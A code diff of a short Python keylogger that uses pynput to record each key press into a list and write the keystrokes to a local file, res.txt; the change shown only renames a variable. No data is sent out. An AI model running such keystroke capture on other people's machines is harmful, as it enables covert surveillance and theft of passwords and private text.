@@ -1,20 +1,20 @@
 from time import sleep
 from pynput import keyboard
 
-global WhatWasTyped
+global typed
 global final_chars
 
-WhatWasTyped = []
+typed = []
 final_chars = ""
 
 #write string of text to a file
 
 def write_to_file():
     global final_chars
-    global WhatWasTyped
+    global typed
     
     #Join the list and convert to a string
-    final_chars = "".join(map(str, WhatWasTyped))
+    final_chars = "".join(map(str, typed))
     final_chars  = final_chars.replace("''", "") 
      
     f = open("res.txt", "w")
@@ -24,7 +24,7 @@ def write_to_file():
 #read key input  
    
 def on_press(key):
-    global WhatWasTyped
+    global typed
       
     key = str(key)
     
@@ -35,7 +35,7 @@ def on_press(key):
     else:
         pass
 
-    WhatWasTyped.append(str(key))
+    typed.append(str(key))
     
 def on_release(key):
     if str(key) == 'Key.esc':
